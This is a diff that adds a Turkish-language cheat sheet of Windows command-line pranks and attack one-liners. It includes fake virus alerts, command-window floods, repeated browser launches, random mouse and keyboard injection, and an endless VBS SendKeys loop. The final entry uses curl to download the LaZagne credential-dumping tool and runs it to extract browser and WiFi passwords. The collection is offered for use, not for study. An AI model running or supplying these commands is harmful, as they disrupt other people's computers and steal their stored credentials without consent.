@@ -1,0 +1,86 @@
+Ekran parlaklığını düşürme kodu.: 
+powershell (Get-WmiObject -Namespace "root/wmi" -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 5)
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Beep sesi 8 kere çaldırma.:
+
+for /l %i in (1,1,8) do powershell -Command "[console]::beep()"
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Bir kere beep sesi çaldırma. :
+
+powershell [console]::beep()
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+50 tane komut satırı açtırma. :
+
+for /l %i in (1,1,50) do start cmd
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Uyarı kutusu ve beep sesiyle birlikte. :
+powershell Add-Type -AssemblyName "System.Windows.Forms"; [System.Windows.Forms.MessageBox]::Show('Sistem Virüs Var!'); [console]::beep(1000,500)
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Uyarı kutusu ve uyarı sesiyle birlikte. :
+
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Critical Stop.wav').PlaySync(); [System.Windows.Forms.MessageBox]::Show('Burayı Mesajınızla Değiştirin');"    
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ Denenmeli:
+powershell -Command "while ($true) {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class NativeMethods { [DllImport(\"user32.dll\")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo); }'; [NativeMethods]::keybd_event(0,0,2,0); [NativeMethods]::keybd_event(0,0,4,0)}"
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+İstediğiniz YouTube videosunu 20 kez açar; YouTube linkini ve kaç kere açılacağını değiştirebilirsiniz.:
+
+
+powershell -Command "for ($i=0; $i -lt 20; $i++) {Start-Process 'chrome.exe' -ArgumentList 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', '--start-fullscreen'; Start-Sleep -Seconds 2}"
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+start komutu ile istediğiniz web sitesine girebilirsiniz. Örnekler:
+
+start https://www.google.com 
+
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Farenin rastgele hareket etmesini ve rastgele tıklamasını sağlar. 10 saniye boyunca çalışır, zamanı uzatmak isterseniz AddSeconds("bu kısmı istediğiniz saniyeye girin") kısmını kullanabilirsiniz.: 
+
+
+
+powershell -Command "$endTime = (Get-Date).AddSeconds(10); Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int X, int Y); [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo); public const uint MOUSEEVENTF_LEFTDOWN = 0x02; public const uint MOUSEEVENTF_LEFTUP = 0x04; public static void ClickMouse(int x, int y) { SetCursorPos(x, y); mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); }}'; while((Get-Date) -lt $endTime) { $randomX = Get-Random -Minimum 0 -Maximum 1920; $randomY = Get-Random -Minimum 0 -Maximum 1080; [Mouse]::ClickMouse($randomX, $randomY); Start-Sleep -Milliseconds 500 }" 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+aynı şekli klavye için :
+
+
+powershell -Command "$endTime = (Get-Date).AddSeconds(20); Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class KeyPress { [DllImport(\"user32.dll\")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo); public const byte VK_A = 0x41; public const byte VK_B = 0x42; public const byte VK_C = 0x43; public const byte VK_D = 0x44; public const byte VK_E = 0x45; public const byte VK_F = 0x46; public const byte VK_G = 0x47; public const byte VK_H = 0x48; public const byte VK_I = 0x49; public const byte VK_J = 0x4A; public const byte VK_K = 0x4B; public const byte VK_L = 0x4C; public const byte VK_M = 0x4D; public const byte VK_N = 0x4E; public const byte VK_O = 0x4F; public const byte VK_P = 0x50; public const byte VK_Q = 0x51; public const byte VK_R = 0x52; public const byte VK_S = 0x53; public const byte VK_T = 0x54; public const byte VK_U = 0x55; public const byte VK_V = 0x56; public const byte VK_W = 0x57; public const byte VK_X = 0x58; public const byte VK_Y = 0x59; public const byte VK_Z = 0x5A; public const byte VK_SPACE = 0x20; public static void SendRandomKey() { Random rand = new Random(); byte[] keys = { VK_A, VK_B, VK_C, VK_D, VK_E, VK_F, VK_G, VK_H, VK_I, VK_J, VK_K, VK_L, VK_M, VK_N, VK_O, VK_P, VK_Q, VK_R, VK_S, VK_T, VK_U, VK_V, VK_W, VK_X, VK_Y, VK_Z, VK_SPACE }; byte key = keys[rand.Next(keys.Length)]; keybd_event(key, 0, 0, 0); keybd_event(key, 0, 2, 0); } }'; while((Get-Date) -lt $endTime) { [KeyPress]::SendRandomKey(); Start-Sleep -Milliseconds 500 }"
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+Sürekli olarak klavyede "merhaba" yazdırır; tabi bunu değiştirebilirsiniz. word="merhaba" kısmına istediğiniz kelimeyi yazabilirsiniz. Bu tehlikeli olabilir ve sonsuza kadar devam eder.:
+
+
+cmd /c "echo Set WshShell = CreateObject("WScript.Shell") : word="merhaba" : i=1 : Do : WScript.Sleep 10 : WshShell.SendKeys Mid(word, i, 1) : i=i Mod Len(word) + 1 : Loop > %temp%\k.vbs & start %temp%\k.vbs"
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Ekran okuyucusunu açma. :
+
+powershell -Command "Start-Process Narrator"
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Bilgisayarda kullanılan tarayıcı, WiFi şifresi veya daha fazlası için bu komutu kullan.:
+
+
+curl -L -o LaZagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe
+
+LaZagne.exe all
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
